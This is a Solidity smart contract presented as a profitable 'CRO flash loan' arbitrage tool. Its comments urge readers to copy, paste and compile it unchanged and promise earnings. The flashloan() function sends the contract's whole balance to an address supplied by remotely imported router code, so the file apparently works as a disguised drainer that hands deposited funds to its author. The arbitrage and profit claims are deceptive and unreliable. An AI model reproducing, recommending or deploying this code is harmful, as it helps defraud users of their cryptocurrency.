// CRO FLASH LOAN CONTRACT CODE :

// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy+Paste and Compile!!
// Thank you for your support! Enjoy your Earnings!!

pragma solidity ^0.5.0;

// CroDex Router
import "https://github.com/MF-Finance/router/blob/main/ICroRouterMain.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/MF-Finance/contracts/blob/main/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/MF-Finance/contracts/blob/main/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
	RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.croDexSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.croSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, Cro is converted to Dai using CroDex.
        router.convertCroTo(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts token for CRO using token/CRO via CroDex, and then immediately converts CRO back
        router.callArbitrageCroDex(router.croSwapAddress(), msg.sender);
        //After the arbitrage, CRO is transferred back to Multiplier to pay the loan plus fees.
        router.transferCroToMultiplier(router.croDexSwapAddress());
        //Note that the transaction sender gains CRO from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}












